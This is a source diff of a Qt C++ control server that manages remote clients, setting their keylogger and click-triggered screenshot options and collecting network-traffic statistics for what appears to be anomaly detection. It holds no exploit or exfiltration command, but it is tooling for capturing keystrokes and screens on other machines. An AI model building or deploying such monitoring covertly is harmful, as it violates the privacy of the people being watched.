@@ -16,18 +16,8 @@ Server::Server(QWidget *parent, const QString& defaultPath, quint16 port_) :
     fileClient{std::make_unique<FileClient>(this, "127.0.0.1", 1234)}
 {
     ui->setupUi(this);
-    ui->buttonFileDialog->setEnabled(false);
-    ui->buttonSaveConfig->setEnabled(false);
-    ui->buttonSendConfig->setEnabled(false);
-    //Screenshot
-    ui->spinSeconds->setEnabled(false);
-    ui->checkLMB->setEnabled(false);
-    ui->checkRMB->setEnabled(false);
-    ui->checkMMB->setEnabled(false);
-    ui->checkMWH->setEnabled(false);
-    //Keylogger
-    ui->checkOnOff->setEnabled(false);
-    ui->spinSeconds2->setEnabled(false);
+
+    setEnabledUi(false);
 
     loadUsers();
 
@@ -44,28 +34,70 @@ Server::Server(QWidget *parent, const QString& defaultPath, quint16 port_) :
     uiMapper->addMapping(ui->checkMWH, 7);
     uiMapper->addMapping(ui->checkOnOff, 8);
     uiMapper->addMapping(ui->spinSeconds2, 9);
+    uiMapper->addMapping(ui->nLine, 10);
+    uiMapper->addMapping(ui->d0Line, 11);
+    uiMapper->addMapping(ui->kLine, 12);
+    uiMapper->addMapping(ui->v1, 13);
+    uiMapper->addMapping(ui->v2, 14);
+    uiMapper->addMapping(ui->v3, 15);
+    uiMapper->addMapping(ui->v4, 16);
+    uiMapper->addMapping(ui->v5, 17);
+    uiMapper->addMapping(ui->v6, 18);
+    uiMapper->addMapping(ui->v7, 19);
+    uiMapper->addMapping(ui->w1, 20);
+    uiMapper->addMapping(ui->w2, 21);
+    uiMapper->addMapping(ui->w3, 22);
+    uiMapper->addMapping(ui->w4, 23);
+    uiMapper->addMapping(ui->w5, 24);
+    uiMapper->addMapping(ui->w6, 25);
+    uiMapper->addMapping(ui->w7, 26);
+
 
     //Hide model items in tree view
-    for (int i=3; i<=9; ++i)
+    for (int i=3; i<=26; ++i)
         ui->treeUsers->setColumnHidden(i, true);
 
-    connect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged,
-            [this](const QModelIndex& current, const QModelIndex&  /* previous */ ) {
-                uiMapper->setCurrentIndex(current.row());
-                ui->buttonFileDialog->setEnabled(true);
-                ui->buttonSaveConfig->setEnabled(true);
-                ui->buttonSendConfig->setEnabled(true);
-                ui->spinSeconds->setEnabled(true);
-                ui->checkLMB->setEnabled(true);
-                ui->checkRMB->setEnabled(true);
-                ui->checkMMB->setEnabled(true);
-                ui->checkMWH->setEnabled(true);
-                ui->checkOnOff->setEnabled(true);
-                ui->spinSeconds2->setEnabled(true);
-                //Disconnect after first time
-                disconnect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged, 0, 0);
+
+    //TODO check disconnect ??
+    auto conn = std::make_shared<QMetaObject::Connection>();
+    *conn = QObject::connect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged,
+                        [this, conn](const QModelIndex& current, const QModelIndex&  /* previous */ ) {
+        uiMapper->setCurrentIndex(current.row());
+        setEnabledUi(true);
+        //Disconnect after first time
+//        disconnect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged, 0, 0);
+        //qDebug () << "disconnected";
+        disconnect(*conn);
     });
 
+
+    //Change index and load combobox when other user is selected
+    connect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged,
+            [this](const QModelIndex& current, const QModelIndex& /*previous */) {
+        int row = current.row();
+        uiMapper->setCurrentIndex(row);
+        loadCombobox(row);
+    });
+
+    //Load combobox and features
+    connect(ui->dateComboBox, QOverload<const QString &>::of(&QComboBox::currentIndexChanged), [this](const QString& text)
+    {
+        const QModelIndex& curr =  ui->treeUsers->currentIndex();
+        if (curr.isValid() && ( !text.isEmpty()) )
+        {
+            const QString& ip = treeModel->index(curr.row(), 1).data().toString();
+            auto features = users[ip]->features[text];
+            ui->f1->setText(QString::number((features.at(0))));
+            ui->f2->setText(QString::number((features.at(1))));
+            ui->f3->setText(QString::number((features.at(2))));
+            ui->f4->setText(QString::number((features.at(3))));
+            ui->f5->setText(QString::number((features.at(4))));
+            ui->f6->setText(QString::number((features.at(5))));
+            ui->f7->setText(QString::number((features.at(6))));
+        }
+    });
+
+    ////////////////////////////////////////////////////
 
     QDir configDir;
     configDir.mkpath(path + "/configs");
@@ -113,7 +145,7 @@ Server::~Server()
 void Server::setupModels()
 {
     treeModel = std::make_unique<QStandardItemModel>(this);
-    treeModel->setColumnCount(10);
+    treeModel->setColumnCount(27);
 
     //Set header names
     treeModel->setHeaderData(0, Qt::Horizontal, "username");
@@ -126,54 +158,74 @@ void Server::setupModels()
     treeModel->setHeaderData(7, Qt::Horizontal, "MWH");
     treeModel->setHeaderData(8, Qt::Horizontal, "isLogWorking");
     treeModel->setHeaderData(9, Qt::Horizontal, "SecondLog");
+    treeModel->setHeaderData(10, Qt::Horizontal, "N");
+    treeModel->setHeaderData(11, Qt::Horizontal, "d0");
+    treeModel->setHeaderData(12, Qt::Horizontal, "k");
+    treeModel->setHeaderData(13, Qt::Horizontal, "v1");
+    treeModel->setHeaderData(14, Qt::Horizontal, "v2");
+    treeModel->setHeaderData(15, Qt::Horizontal, "v3");
+    treeModel->setHeaderData(16, Qt::Horizontal, "v4");
+    treeModel->setHeaderData(17, Qt::Horizontal, "v5");
+    treeModel->setHeaderData(18, Qt::Horizontal, "v6");
+    treeModel->setHeaderData(19, Qt::Horizontal, "v7");
+    treeModel->setHeaderData(20, Qt::Horizontal, "w1");
+    treeModel->setHeaderData(21, Qt::Horizontal, "w2");
+    treeModel->setHeaderData(22, Qt::Horizontal, "w3");
+    treeModel->setHeaderData(23, Qt::Horizontal, "w4");
+    treeModel->setHeaderData(24, Qt::Horizontal, "w5");
+    treeModel->setHeaderData(25, Qt::Horizontal, "w6");
+    treeModel->setHeaderData(26, Qt::Horizontal, "w7");
 
     //Traverse existing users and add to model
-    QList<QStandardItem*> items;
     for (const auto& user: users)
     {
-        User* currUser = user.second.get();
-        const QString& ip = user.first;
-        const QString& username = currUser->username;
-        const quint16& port = currUser->port;
+        const User& currUser = *user.second.get();
 
         //load configs
-        Config* cfg = currUser->cfg.get();
-        cfg = new Config;
-        if (!loadConfig(*cfg, path + "/configs/" + ip + ".cfg"))
-            saveConfig(*cfg, path + "/configs/" + ip + ".cfg");
+        Config& cfg = *currUser.cfg.get();
+        const QString& ip = user.first;
+        if (!loadConfig(cfg, path + "/configs/" + ip + ".cfg"))
+            saveConfig(cfg, path + "/configs/" + ip + ".cfg");
 
-        initTreeModel(items, ip, username, port, cfg, State::OFFLINE);
+        addUserToModel(currUser, State::OFFLINE);
     }
 }
 
-void Server::initTreeModel(QList<QStandardItem*>& items,
-                           const QString& ip,
-                           const QString& username,
-                           const quint16 port,
-                           const Config* cfg,
-                           const State& st)
+void Server::addUserToModel(const User& user, const State& st)
 {
+    QList<QStandardItem*> items;
     //Create items and write to model
-    QStandardItem* ipItem = new QStandardItem(ip);
-    QStandardItem* nameItem = new QStandardItem(QIcon((st == State::ONLINE) ? ":/icons/online.png" : ":/icons/offline.png"), username);
-    QStandardItem* portItem = new QStandardItem( QString::number(port) );
+    QStandardItem* nameItem = new QStandardItem(QIcon((st == State::ONLINE) ? ":/icons/online.png" : ":/icons/offline.png"), user.username);
+    QStandardItem* ipItem = new QStandardItem(user.ip);
+    QStandardItem* portItem = new QStandardItem( QString::number(user.port) );
 
     //Set not editable item
-    ipItem->setFlags(ipItem->flags() & ~Qt::ItemIsEditable);
     nameItem->setFlags(nameItem->flags() & ~Qt::ItemIsEditable);
+    ipItem->setFlags(ipItem->flags() & ~Qt::ItemIsEditable);
     portItem->setFlags(portItem->flags() & ~Qt::ItemIsEditable);
 
-    QStandardItem* secondsItem = new QStandardItem(QString::number(cfg->secondsScreen));
-    QStandardItem* LMB = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::left)] ? "1" : "0"));
-    QStandardItem* RMB = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::right)] ? "1" : "0"));
-    QStandardItem* MMB = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::middle)] ? "1" : "0"));
-    QStandardItem* MWH = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::wheel)] ? "1" : "0"));
-    QStandardItem* secondsLogItem = new QStandardItem(QString::number(cfg->secondsLog));
-    QStandardItem* logRunItem = new QStandardItem(cfg->logRun ? "1" : "0");
+    items << nameItem << ipItem << portItem;
 
-    items << nameItem << ipItem << portItem << secondsItem << LMB << RMB << MMB << MWH << logRunItem << secondsLogItem;
+    items << new QStandardItem(QString::number(user.cfg->secondsScreen))
+          <<  new QStandardItem(QString(user.cfg->mouseButtons[int(Buttons::left)] ? "1" : "0"))
+          << new QStandardItem(QString(user.cfg->mouseButtons[int(Buttons::right)] ? "1" : "0"))
+          << new QStandardItem(QString(user.cfg->mouseButtons[int(Buttons::middle)] ? "1" : "0"))
+          << new QStandardItem(QString(user.cfg->mouseButtons[int(Buttons::wheel)] ? "1" : "0"))
+          << new QStandardItem(user.cfg->logRun ? "1" : "0")
+          << new QStandardItem(QString::number(user.cfg->secondsLog));
+
+    items << new QStandardItem(QString::number(user.N))
+          << new QStandardItem(QString::number(user.d0))
+          << new QStandardItem(QString::number(user.k));
+
+    //Add one-sided deviations vector & weights
+    for(int i = 0; i < 7; ++i)
+        items << new QStandardItem(QString::number(user.onesided.at(i)));
+
+    for(int i = 0; i < 7; ++i)
+        items << new QStandardItem(QString::number(user.weights.at(i)));
+
     treeModel->appendRow(items);
-    items.clear();
 }
 
 void Server::setStatus(const State& status, const QString& ip)
@@ -202,6 +254,102 @@ void Server::setStatus(const State& status, const QString& ip)
     }
 }
 
+void Server::setEnabledUi(bool b)
+{
+    ui->buttonFileDialog->setEnabled(b);
+    ui->buttonSaveConfig->setEnabled(b);
+    ui->buttonSendConfig->setEnabled(b);
+    //Screenshot
+    ui->spinSeconds->setEnabled(b);
+    ui->checkLMB->setEnabled(b);
+    ui->checkRMB->setEnabled(b);
+    ui->checkMMB->setEnabled(b);
+    ui->checkMWH->setEnabled(b);
+    //Keylogger
+    ui->checkOnOff->setEnabled(b);
+    ui->spinSeconds2->setEnabled(b);
+
+    ui->nLine->setEnabled(b);
+    ui->d0Line->setEnabled(b);
+    ui->kLine->setEnabled(b);
+    ui->dateComboBox->setEnabled(b);
+
+    //Features and weights
+    ui->v1->setEnabled(b);
+    ui->v2->setEnabled(b);
+    ui->v3->setEnabled(b);
+    ui->v4->setEnabled(b);
+    ui->v5->setEnabled(b);
+    ui->v6->setEnabled(b);
+    ui->v7->setEnabled(b);
+
+    ui->w1->setEnabled(b);
+    ui->w2->setEnabled(b);
+    ui->w3->setEnabled(b);
+    ui->w4->setEnabled(b);
+    ui->w5->setEnabled(b);
+    ui->w6->setEnabled(b);
+    ui->w7->setEnabled(b);
+
+}
+
+void Server::loadCombobox(int& row)
+{
+    QStringList sl;
+    //Get current user
+    const QString& ip = treeModel->index(row, 1).data().toString();
+    const auto& features = users[ip]->features;
+    for(auto f : features.keys())
+    {
+        sl << f;
+    }
+    ui->dateComboBox->clear();
+    ui->dateComboBox->addItems(sl);
+}
+
+void Server::setupUserConnections(const User& user)
+{
+    //Update combobox after receiving new data
+    connect(&user, &User::dataChanged, [this, &user](const QString data)
+    {
+        const QModelIndex& curr =  ui->treeUsers->currentIndex();
+        if (curr.isValid())
+        {
+            //Check if the same user is selected & the same date
+            if ((treeModel->index(curr.row(), 0).data().toString() == user.username) &&
+                (ui->dateComboBox->currentText() == data))
+            {
+                    const QString& ip = treeModel->index(curr.row(), 1).data().toString();
+                    auto features = users[ip]->features[data];
+                    ui->f1->setText(QString::number((features.at(0))));
+                    ui->f2->setText(QString::number((features.at(1))));
+                    ui->f3->setText(QString::number((features.at(2))));
+                    ui->f4->setText(QString::number((features.at(3))));
+                    ui->f5->setText(QString::number((features.at(4))));
+                    ui->f6->setText(QString::number((features.at(5))));
+                    ui->f7->setText(QString::number((features.at(6))));
+            }
+        }
+    });
+
+    //add new data to combobox
+    connect(&user, &User::newData, [this, &user](const QString date)
+    {
+        //The same user
+        const QModelIndex& curr =  ui->treeUsers->currentIndex();
+        if (curr.isValid() && (treeModel->index(curr.row(), 0).data().toString() == user.username))
+        {
+            ui->dateComboBox->addItem(date);
+        }
+    });
+
+    //Set offline after 2 min
+    connect(&user, &User::changedStatus, [this](State st, QString ip)
+    {
+        setStatus(st, ip);
+    });
+}
+
 bool Server::saveUsers()
 {
     QFile usersFile(path + "/list.usr");
@@ -211,11 +359,18 @@ bool Server::saveUsers()
     for(const auto& user: users)
     {
         User* currUser = user.second.get();
+        setData(*currUser); //load from model to user
         stream << currUser->username
                << currUser->ip
-               << currUser->port;
+               << currUser->port
+               << currUser->N
+               << currUser->d0
+               << currUser->k
+               << currUser->onesided
+               << currUser->features
+               << currUser->weights;
     }
-//    stream << users;
+
     usersFile.close();
     return true;
 }
@@ -230,20 +385,23 @@ bool Server::loadUsers()
         QDataStream stream(&usersFile);
         QString username, ip;
         quint16 port;
+        bool b = false;
+        quint64 d0;
+        uint N;
+        float k;
+        QVector<int> onesided;
+        QVector<float> weights;
+        QMap<QString, QVector<quint64>> features;
         //Read from file
         while( !stream.atEnd() )
         {
-            stream >> username >> ip >> port;
+            stream >> username >> ip >> port >> N >> d0 >> k >> onesided >> features >> weights;
             auto pair = users.emplace(std::piecewise_construct,
                                 std::forward_as_tuple(ip),
-                                std::forward_as_tuple(std::make_unique<User>(username, ip, port, false)));
+                                std::forward_as_tuple(std::make_unique<User>(username, ip, port, b, d0, N, k, onesided, features, weights)));
 
-            //Set offline after 2 min
-            User* currUser = (*pair.first).second.get();
-            connect(currUser, &User::changedStatus, [this](State st, QString ip)
-            {
-                setStatus(st, ip);
-            });
+            User& currUser = *(*pair.first).second.get();
+            setupUserConnections(currUser);
         }
         usersFile.close();
 
@@ -273,69 +431,79 @@ void Server::getString(const QString str, const QString ip)
     //Parse string
     const QString& command = str.section('|', 0, 0);
 
+    //Check if user already exists
+    bool userExists = false;
+    auto user = users.find(ip);
+    if (user != users.end())
+        userExists = true;
+
+    const QString& username = str.section("|", 1, 1);
+    const quint16& port = str.section("|", 2, 2).toInt();
+
     if (command == "ONLINE")
     {
-        const QString& username = str.section("|", 1, 1);
-        const quint16& port = str.section("|", 2, 2).toInt();
-
         //If QHash doesn't contain user's ip => add user
-        if (users.find(ip) == users.end())
+        if ( !userExists )
         {
             //Add new user
+            bool b = true;
             auto pair = users.emplace(std::piecewise_construct,
                       std::forward_as_tuple(ip),
-                      std::forward_as_tuple(std::make_unique<User>(username, ip, port, true)));
+                      std::forward_as_tuple(std::make_unique<User>(username, ip, port, b)));
 
-            User* currUser = (*pair.first).second.get();
+            User& currUser = *(*pair.first).second.get();
 
             QString cfgPath = path + "/configs/" + ip + ".cfg";
-            Config* config = currUser->cfg.get();
+            Config& config = *currUser.cfg.get();
             //If config doesn't exist
-            if( ! loadConfig(*config, cfgPath) )
+            if( ! loadConfig(config, cfgPath) )
             {
                 qDebug() << "Config not found. Creating new.";
-                saveConfig(*config, cfgPath);
+                saveConfig(config, cfgPath);
             }
 
             //Add new user to tree model
-            QList<QStandardItem*> items;
-            initTreeModel(items, ip, username, port, config, State::ONLINE);
+            addUserToModel(currUser, State::ONLINE);
 
-            //Set offline after 2 min
-            connect(currUser, &User::changedStatus, [this](State st, QString ip)
-            {
-                setStatus(st, ip);
-            });
+            setupUserConnections(currUser);
+
+            //add time data
+            currUser.setFeatures();
         }
         else
         {
-            User* currUser = users[ip].get();
-            currUser->setStatus(State::ONLINE);
+            user->second->username = username;
+            user->second->port = port;
+            user->second->setStatus(State::ONLINE);
+
+            user->second->setFeatures();
         }
     }
     else if (command == "OFFLINE")
     {
-        User* currUser = users[ip].get();
-        currUser->setStatus(State::OFFLINE);
+        if (userExists)
+            user->second->setStatus(State::OFFLINE);
     }
     else if (command == "DATA")
     {
-        //TODO
-        //get date and time
-        quint64 totalUp = str.section("|", 1, 1).toInt();
-        quint64 connUp = str.section("|", 2, 2).toInt();
-        quint64 totalDown = str.section("|", 3, 3).toInt();
-        quint64 connDown = str.section("|", 4, 4).toInt();
-        qDebug() << totalUp << connUp << totalDown << connDown << ip;
-
-        //User* currUser = users[ip].get();
+        if (userExists)
+        {
+            user->second->setStatus(State::ONLINE);
+            user->second->setFeatures(str.section("|", 1, 1).toInt(),
+                                      str.section("|", 2, 2).toInt(),
+                                      str.section("|", 3, 3).toInt(),
+                                      str.section("|", 4, 4).toInt());
+        }
+        else
+            return;
     }
 }
 
 void Server::setConfig(Config &cfg)
 {
     //If selected nothing
-    if (ui->treeUsers->currentIndex() == QModelIndex())
+    //TODO
+    if ( ! ui->treeUsers->currentIndex().isValid()) //== QModelIndex())
         return;
     else
     {
@@ -356,10 +524,32 @@ void Server::setConfig(Config &cfg)
     }
 }
 
+void Server::setData(User &user)
+{
+    //If selected nothing
+    //TODO
+    if ( ! ui->treeUsers->currentIndex().isValid()) //== QModelIndex())
+        return;
+    else
+    {
+        int currentRow = ui->treeUsers->currentIndex().row();
+        for(int i = 0; i < 7; ++i)
+        {
+            user.onesided[i] = treeModel->index(currentRow, 13+i).data().toInt();
+            user.weights[i] = treeModel->index(currentRow, 20+i).data().toFloat();
+        }
+
+        user.N = treeModel->index(currentRow, 10).data().toInt();
+        user.d0 = treeModel->index(currentRow, 11).data().toULongLong();
+        user.k = treeModel->index(currentRow, 12).data().toFloat();
+    }
+}
+
 void Server::configSendClicked()
 {
     //If selected nothing
-    if (ui->treeUsers->currentIndex() == QModelIndex())
+    //TODO
+    if ( ! ui->treeUsers->currentIndex().isValid()) //== QModelIndex())
         return;
     else
     {
@@ -397,7 +587,8 @@ void Server::configSendClicked()
 void Server::configSaveClicked()
 {
     //If selected nothing
-    if (ui->treeUsers->currentIndex() == QModelIndex())
+    //TODO
+    if ( ! ui->treeUsers->currentIndex().isValid()) //== QModelIndex())
         return;
     else
     {
@@ -426,11 +617,8 @@ void Server::fileDialogClicked()
 void Server::fileDialogAccepted()
 {
     QString mask = QString::number(fileDialog->getFileMask());
-    //TODO del
-
-//    QString string = fileDialog->getFileString();
-
     //If no parameters set or user isn't selected
+    //TODO
     if ( (mask == "0" /* && string.isEmpty() */ ) || ui->treeUsers->currentIndex() == QModelIndex())
         return;
     else
